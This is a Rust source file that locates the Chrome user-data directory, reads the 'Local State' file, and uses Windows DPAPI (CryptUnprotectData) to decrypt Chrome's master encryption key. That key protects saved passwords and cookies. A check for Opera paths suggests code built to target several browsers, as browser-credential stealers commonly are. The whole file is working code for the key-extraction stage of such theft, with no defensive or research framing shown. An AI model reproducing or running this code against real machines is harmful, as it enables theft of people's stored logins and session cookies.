use std::env;
use std::path::{Path, PathBuf};
use std::error::Error;
use std::fs;
use serde_json::Value;
use winapi::um::dpapi::CryptUnprotectData;
use winapi::um::wincrypt::CRYPTOAPI_BLOB;

pub fn chrome_master_key() -> Vec<u8>{
    let userprofile = env::var("USERPROFILE").unwrap();
    let appdata_dir = Path::new(userprofile.as_str()).join("AppData");

    let browser_target = "Local\\Google\\Chrome";

    let browser_dir = appdata_dir.join(browser_target);

    let user_data_dir = get_user_data_dir(&browser_dir).unwrap();
    let local_state_path = user_data_dir.join("Local State");
    let master_key = get_master_key(&local_state_path).unwrap();
    return master_key;
}

fn get_user_data_dir(browser_dir: &PathBuf) -> Result<PathBuf, Box<dyn Error>> {
    let mut user_data_dir = browser_dir.to_owned();

    if !browser_dir.to_string_lossy().contains("Opera Software") {
        user_data_dir = user_data_dir.join("User Data");
    }
    return Ok(user_data_dir);
}

pub fn get_master_key(master_key_path: &PathBuf) -> Option<Vec<u8>> {
    let contents = fs::read_to_string(master_key_path).ok()?;

    let json: Value = serde_json::from_str(contents.as_str()).ok()?;

    if let Some(encrypted_key) = json["os_crypt"]["encrypted_key"].as_str() {
        let plain_text = base64::decode(encrypted_key).ok()?[5..].to_vec();
        let master_key = dpapi_decrypt(plain_text);
        return Some(master_key);
        //return Some(plain_text);
    }
    return None;
}

fn dpapi_decrypt(mut cipher_text: Vec<u8>) -> Vec<u8> {
    let mut in_data = CRYPTOAPI_BLOB {
        cbData: cipher_text.len() as u32,
        pbData: cipher_text.as_mut_ptr(),
    };

    let mut out_data = CRYPTOAPI_BLOB {
        cbData: 0,
        pbData: std::ptr::null_mut(),
    };

    unsafe {
        CryptUnprotectData(
            &mut in_data,
            std::ptr::null_mut(),
            std::ptr::null_mut(),
            std::ptr::null_mut(),
            std::ptr::null_mut(),
            0,
            &mut out_data,
        );

        let plain_text = Vec::from_raw_parts(
            out_data.pbData,
            out_data.cbData as usize,
            out_data.cbData as usize,
        );

        return plain_text;
    };
}